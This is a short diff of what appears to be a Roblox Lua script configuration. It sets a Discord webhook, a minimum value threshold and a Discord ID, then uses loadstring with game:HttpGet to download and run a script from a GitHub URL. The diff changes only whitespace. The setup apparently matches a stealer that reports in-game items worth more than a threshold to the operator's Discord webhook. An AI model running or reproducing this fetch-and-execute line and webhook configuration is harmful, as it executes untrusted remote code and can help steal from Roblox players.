@@ -3,4 +3,4 @@ Webhook = "https://canary.discord.com/api/webhooks/1382771836500054177/4YzMuwvH6
 MinimumValue = 25
 DiscordID = "493552172135612426"
 
-loadstring (game:HttpGet("https://raw.githubusercontent.com/ShinraScriptz/ProjectReverse/refs/heads/main/ProjectReverse"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinraScriptz/ProjectReverse/refs/heads/main/ProjectReverse"))()
